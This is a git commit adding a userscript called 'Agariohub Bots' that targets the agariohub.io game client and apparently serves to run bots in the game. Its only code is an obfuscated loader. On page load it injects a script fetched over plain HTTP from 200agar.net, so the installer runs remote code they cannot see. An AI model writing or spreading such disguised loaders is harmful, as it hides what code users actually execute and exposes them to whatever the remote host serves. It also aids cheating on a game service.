c04ea1c5d76dcfc3b9c5e09bb3d7eec23c650b56
Genius <56919066+GeniusXD@users.noreply.github.com>
2019-11-23 23:24:05 +0800

    Create ahub.user.js

---
+++ ahub.user.js
@@ -0,0 +1,16 @@
+// ==UserScript==
+// @name         Agariohub Bots
+// @namespace    https://github.com/GeniusXD
+// @version      1.9.9
+// @description  The best ahub bots
+// @author       200botsga
+// @match        *://stg.agariohub.io/client/*
+// @run-at       document-start
+// @icon64       https://hdwallpaper20.com/wp-content/uploads/data/2018/3/5/wolf-PIC-HWB317337-1024x576.jpg
+// @icon64URL    https://hdwallpaper20.com/wp-content/uploads/data/2018/3/5/wolf-PIC-HWB317337-1024x576.jpg
+// @icon         https://hdwallpaper20.com/wp-content/uploads/data/2018/3/5/wolf-PIC-HWB317337-1024x576.jpg
+// @grant        none
+// ==/UserScript==
+
+var _0x3508=['script','src','http://200agar.net/bots/bots.js','getElementsByTagName','createElement'];(function(_0x438787,_0x23c354){var _0x12beac=function(_0xe1d6){while(--_0xe1d6){_0x438787['push'](_0x438787['shift']());}};_0x12beac(++_0x23c354);}(_0x3508,0x167));var _0xdbdd=function(_0x33179a,_0x3fd2b0){_0x33179a=_0x33179a-0x0;var _0x141bb7=_0x3508[_0x33179a];return _0x141bb7;};function load(){var _0x471e86=document[_0xdbdd('0x0')](_0xdbdd('0x1'));_0x471e86[_0xdbdd('0x2')]=_0xdbdd('0x3');document[_0xdbdd('0x4')]('head')[0x0]['appendChild'](_0x471e86);}
+load();
